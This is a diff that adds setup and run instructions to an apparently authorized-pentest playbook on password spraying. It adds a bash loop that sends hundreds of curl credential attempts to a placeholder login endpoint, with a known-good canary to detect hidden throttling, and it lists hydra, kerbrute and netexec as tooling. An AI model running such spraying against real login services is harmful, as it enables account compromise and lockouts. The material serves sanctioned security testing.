@@ -25,6 +25,34 @@ Password spraying is the highest-ROI credential attack: one (or few) passwords t
 - Any leaked credential dump from client — validate against all services
 - Active-attacker detection via Smart Lockout differential
 
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `hashcat`, `hydra`, `kerbrute`, `netexec`, `nxc`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Inject a known-good credential at position 500
+# If it stops working under load, shadow-throttle is active
+# Your "no rate limit" conclusion was false
+KNOWN_GOOD="user@target.com:CorrectP@ss"
+for n in $(seq 0 600); do
+  creds="user${n}@target.com:WrongP@ss"
+  [ $((n % 100)) -eq 0 ] && creds="$KNOWN_GOOD"   # canary: known-good must keep working
+  code=$(curl --max-time 30 --connect-timeout 10 -sk -u "$creds" -o /tmp/bf_body -w "%{http_code}" \
+    "https://TARGET/auth-endpoint")
+  echo "$n $code $(wc -c </tmp/bf_body)"
+done
+# Watch: status flips, time_total climbing, body size changing
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
+
 ## Universal Spray Pipeline (5 Phases)
 
 ```
